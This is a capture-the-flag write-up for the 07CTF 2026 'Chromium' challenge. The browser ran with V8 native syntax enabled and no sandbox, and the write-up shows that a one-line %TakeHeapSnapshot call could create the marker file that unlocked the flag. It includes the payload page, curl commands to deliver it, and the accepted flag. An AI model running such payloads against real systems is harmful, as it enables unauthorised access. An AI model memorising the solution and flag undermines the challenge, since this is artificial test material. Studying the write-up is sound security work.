# 07CTF 2026 — Chromium

## Overview

We solved **Chromium** by using an exposed V8 native runtime function to create the file that unlocked the flag:

```html
<script>%TakeHeapSnapshot('/tmp/allow-flag');</script>
```

The browser was launched with native syntax enabled and its OS sandbox disabled. `%TakeHeapSnapshot` accepted an output filename, while the challenge checked only whether `/tmp/allow-flag` existed as a regular file. A heap snapshot satisfied that condition.

This was a **file-presence gate bypass**, not a memory-corruption or arbitrary-code-execution chain. It recovered the real remote flag and received official acceptance.

| Field | Value |
| --- | --- |
| Event | 07CTF 2026 |
| Challenge | Chromium |
| Category / difficulty | Misc / Hard |
| Author | bhavya |
| Team | JackSpeor |
| Browser pinned by the handout | Chrome for Testing 152.0.7967.2, Linux amd64 |
| Accepted at | 2026-09-19 12:49:12 UTC |

The challenge description began:

> I hope there is no way to cheese this.

## 1. Start with the actual success condition

The handout's `challenge/server.py` defined two paths:

```python
FLAG = Path("/flag")
ALLOW_FLAG = Path("/tmp/allow-flag")
```

During a bot visit, the server polled the marker:

```python
if ALLOW_FLAG.is_file():
    status = "revealed"
    break
```

`GET /flag` used the same `ALLOW_FLAG.is_file()` condition before returning `FLAG.read_bytes()`.

The supplied `man` helper also created the marker:

```c
int main(void) {
  int fd = open("/tmp/allow-flag", O_WRONLY | O_CREAT | O_CLOEXEC, 0644);
  if (fd < 0) return 1;
  return close(fd) == 0 ? 0 : 1;
}
```

However, the server never checked that this helper had run. It did not inspect the file's contents either. Any browser-accessible operation capable of creating that regular file could satisfy the gate.

## 2. The browser already exposed a file-writing operation

The relevant launch options in `server.py` were:

```text
--no-sandbox
--js-flags=--expose-gc --allow-natives-syntax --turbolev --max-old-space-size=8192 --min-semi-space-size=64 --max-semi-space-size=64 --single-threaded --single-threaded-gc
```

`--allow-natives-syntax` made V8's `%...` runtime calls available to the submitted JavaScript. We inspected the exact V8 revision referenced by the pinned Chrome build:

```text
d7d77da2d65c86743e1d7fffdde793c33fd2fc3d
```

Its [`Runtime_TakeHeapSnapshot` implementation](https://github.com/v8/v8/blob/d7d77da2d65c86743e1d7fffdde793c33fd2fc3d/src/runtime/runtime-test.cc#L1281-L1300) was:

```cpp
RUNTIME_FUNCTION(Runtime_TakeHeapSnapshot) {
  if (v8_flags.fuzzing) {
    // We don't want to create snapshots in fuzzers.
    return ReadOnlyRoots(isolate).undefined_value();
  }

  std::string filename = "heap.heapsnapshot";

  if (args.length() >= 1) {
    HandleScope hs(isolate);
    DirectHandle<String> filename_as_js_string = args.at<String>(0);
    std::unique_ptr<char[]> buffer = filename_as_js_string->ToCString();
    filename = std::string(buffer.get());
  }

  HeapProfiler* heap_profiler = isolate->heap()->heap_profiler();
  heap_profiler->TakeSnapshotToFile(
      HeapProfiler::GetDefaultHeapSnapshotOptionsForTestingUsage(), filename);
  return ReadOnlyRoots(isolate).undefined_value();
}
```

The first argument replaces the default output filename. Therefore:

```javascript
%TakeHeapSnapshot('/tmp/allow-flag');
```

writes a heap snapshot at exactly the path checked by the server. The snapshot's JSON contents are irrelevant to the gate.

This also explains the conditions required for the technique: the native runtime must be exposed, its fuzzing-mode early return must not apply, and the renderer must have permission to create the file. The challenge's `--no-sandbox` setting was part of the verified environment.

## 3. The complete payload

[`snapshot.html`](snapshot.html) is the exact 134-byte page used in the successful solve:

```html
<!doctype html>
<meta charset="utf-8">
<title>Chromium snapshot test</title>
<script>
%TakeHeapSnapshot('/tmp/allow-flag');
</script>
```

The service accepted an HTTP(S) URL through `POST /submit`. Its loopback mirror fetched the submitted page and preserved its content type, then Chrome visited the mirrored URL.

```text
Hosted HTML
    -> POST /submit with its URL
    -> loopback mirror serves the HTML to Chrome
    -> %TakeHeapSnapshot('/tmp/allow-flag')
    -> ALLOW_FLAG.is_file() becomes true
    -> GET /flag returns the flag
```

There was no need to read `/flag` from JavaScript, invoke the `man` helper, corrupt the heap, or construct a ROP chain.

## 4. Reproduction

Run the following from this directory against a fresh copy of the challenge. Set `TARGET` to that service's origin.

The successful contest delivery used httpbin's `/base64` endpoint to serve the payload as HTML. This generates the same payload URL locally:

```bash
TARGET='http://CHALLENGE_HOST:PORT'

PAYLOAD_URL=$(python3 - <<'PY'
import base64
from pathlib import Path
from urllib.parse import quote

payload = Path("snapshot.html").read_bytes()
encoded = quote(base64.b64encode(payload).decode("ascii"), safe="")
print("https://httpbin.org/base64/" + encoded)
PY
)
```

Only the public HTML payload is encoded in this URL. A directly hosted copy of `snapshot.html` also meets the service's input format; the recorded successful delivery used the httpbin URL above. The payload endpoint must be reachable by the challenge's mirror and serve the document with an HTML content type.

Submit the URL:

```bash
curl --silent --show-error --fail-with-body \
  -H 'Content-Type: application/json' \
  --data "{\"url\":\"$PAYLOAD_URL\"}" \
  "$TARGET/submit"
```

The successful application response was:

```json
{"ok":true,"status":"revealed"}
```

After that response, retrieve the flag:

```bash
curl --silent --show-error --fail-with-body "$TARGET/flag"
```

HTTP 200 from `/submit` alone is not a success signal: the server also uses it for application-level outcomes such as `timeout`. Check the JSON status and the subsequent flag response.

## 5. What we verified

### Local browser execution

We tested the exact Chrome executable from the handout with all of the supplied Chrome launch flags. The page created a valid **2,238,175-byte heap snapshot**, with completion measured **1.633 seconds after the HTML request**, within the bot's 25-second visit budget.

The local dependency image used glibc 2.41, while the handout pinned glibc 2.42-13. The browser bytes and launch flags matched, and this technique uses no libc offsets. The subsequent real remote recovery established that the bypass also worked on the deployed service.

### Remote recovery and acceptance

| Step | Recorded outcome |
| --- | --- |
| Payload hosting | Exact 134-byte page, served as `text/html; charset=utf-8` |
| Baseline `GET /flag` | HTTP 404 at 12:46:43 UTC |
| `POST /submit` | HTTP 200 with `{"ok":true,"status":"revealed"}` at 12:46:46.478331 UTC |
| Subsequent `GET /flag` | HTTP 200; 52 raw response bytes at 12:46:46.937260 UTC |
| Official flag submission | Accepted at 12:49:12.068487 UTC; confirmed by the positive submission result, fresh team profile, and challenge catalog |

All timestamps in this table are from **2026-09-19**. An earlier delivery through a different payload host timed out; its cause was not established. The table describes the later successful delivery, not a claim of success on the first bot visit.

The accepted flag was:

```text
07CTF{noW_gP7_c4n_3v3n_51OP_fUll_8R0wSEr_cHainS_:(}
```

The raw response contained this 51-byte ASCII token followed by a newline. We preserved all 52 response bytes and used the official UI's observed `flag.trim()` behavior for submission.

### Artifact integrity

| Artifact | SHA-256 |
| --- | --- |
| Original handout ZIP | `7db4931d9b7aac8bb03f7e317c2a858e38c71999a19783c5ea14915970cbf4e1` |
| Pinned Chrome executable | `0525ddf01f65c5ac589562cc08c4eeb1875d3c4f7d592ac5a252f867b9e23252` |
| `snapshot.html` | `f1e023bc847f1f45ac2aa4dd1e4bf70a24135617ee2c4acd98ac4fcd1b7822cc` |
| Raw flag response, including newline | `c3fe031df70dd3ee2d479a3b25a60021d5d004f31ab54bf29b5817543e237753` |
| Submitted flag token | `b82b901f339cc33fb828046bc55b9731c24694da965db0365de9a9c7c20558c6` |

[`evidence.json`](evidence.json) contains a compact summary extracted from our retained local, remote-acquisition, and acceptance records. It documents the historical verification; it is not a fresh remote test or a separately signed platform receipt.

## Takeaway

Audit exposed test and diagnostic APIs against the challenge's actual success predicate before building a memory-corruption exploit. Here the complete chain was:

**native syntax enabled → caller-selected snapshot filename → marker file exists → flag endpoint unlocks.**

The demonstrated primitive is heap-snapshot creation at a chosen writable path. It does not establish arbitrary file-content control, general-purpose native code execution, a sandbox escape, or a vulnerability in an ordinary browser running with default settings.

## References and files

- [Payload: `snapshot.html`](snapshot.html)
- [Historical verification summary: `evidence.json`](evidence.json)
- [Chromium 152.0.7967.2 dependency pins](https://github.com/chromium/chromium/blob/152.0.7967.2/DEPS)
- [V8 `Runtime_TakeHeapSnapshot` at the pinned revision](https://github.com/v8/v8/blob/d7d77da2d65c86743e1d7fffdde793c33fd2fc3d/src/runtime/runtime-test.cc#L1281-L1300)
- Challenge handout: `Dockerfile`, `challenge/server.py` lines 20–48, 124–170, and 193–208, and `challenge/man.c` lines 1–8.
